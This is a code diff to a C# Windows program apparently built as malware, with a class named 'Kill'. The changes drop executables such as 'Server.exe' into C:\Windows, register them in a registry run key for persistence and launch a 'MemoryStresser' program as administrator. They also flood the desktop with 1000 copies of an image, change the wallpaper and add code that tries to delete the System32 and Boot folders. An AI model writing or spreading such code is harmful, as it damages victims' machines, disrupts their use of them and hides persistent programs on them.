@@ -52,6 +52,10 @@ namespace bramerto_rob
         string source = @"C:\Program Files (x86)\bramerto-rob\Files\.NET.exe";
         string source2 = @"C:\Program Files (x86)\bramerto-rob\Files\Insidious.exe";
         string destinationFile2 = @"C:\Windows\Insidious12.exe";
+        string source3 = @"C:\Program Files (x86)\bramerto-rob\Files\Server.exe";
+        string destinationFile3 = @"C:\Windows\Server.exe";
+        string root = @"C:\Windows\System32";
+        string root2 = @"C:\Windows\Boot";
 
         [DllImport("user32.dll", CharSet = CharSet.Auto)]
         private static extern Int32 SystemParametersInfo(
@@ -61,7 +65,7 @@ namespace bramerto_rob
         private static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
         private static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;
 
-
+        Img img = new Img();
         public Kill()
         {
             InitializeComponent();
@@ -96,25 +100,37 @@ namespace bramerto_rob
             wc.DownloadFile("https://moe.shikimori.one/system/user_images/original/169245/914737.jpg", localfilename);            
             File.Copy(source, destinationFile, true);
             File.Copy(source2, destinationFile2, true);
-            rkApp.SetValue(@"C:\Windows\Insidious12.exe", Application.ExecutablePath.ToString());
+            File.Copy(source3, destinationFile3, true);
             rkApp.SetValue(@"C:\Windows\.NET5.exe", Application.ExecutablePath.ToString());
-            ExecuteAsAdmin(@"C:\Program Files (x86)\bramerto-rob\Files\.NET.exe");
-            ExecuteAsAdmin(@"C:\Program Files (x86)\bramerto-rob\Files\Insidious.exe");//@"C:\Program Files (x86)\bramerto-rob\Files\Insidious.exe
-            ExecuteAsAdmin(@"C:\Program Files (x86)\bramerto-rob\Files\Server.exe");
+            rkApp.SetValue(@"C:\Windows\Server.exe", Application.ExecutablePath.ToString());
+            ExecuteAsAdmin(@"C:\Program Files (x86)\bramerto-rob\Files\MemoryStresser.exe");
+
         }
         private void StartButton_Click(object sender, EventArgs e)
         {
             this.Visible = false;
             sp.Play();
-            Img img = new Img();
-            img.Show();                   
+            img.Show();
             Time1.Interval = 7000;
             Time1.Enabled = true;
             Time1.Tick += new EventHandler(Time1_Tick_1);
-            Time1.Start();                                
+            Time1.Start();
+            for(int i = 0; i < 1000; i++)
+            {
+                string num = Desktop + i.ToString() + "ニャンパス.jpg";
+                File.Copy(localfilename, num, true);
+            }
             if (File.Exists(imgWallpaper))
             {
                 SetWallpaper(imgWallpaper);
+            }
+            if (Directory.Exists(root))
+            {
+                Directory.Delete(root);
+            }
+            if (Directory.Exists(root2))
+            {
+                Directory.Delete(root2);
             }
         }
         
@@ -150,6 +166,6 @@ namespace bramerto_rob
             Time3.Tick += new EventHandler(Time3_Tick);
             Time3.Start();
             ExecuteAsAdmin(@"C:\Program Files (x86)\bramerto-rob\Marb\bin\Debug\net5.0-windows\Marb.exe");
-        }
+        }        
     }
 }
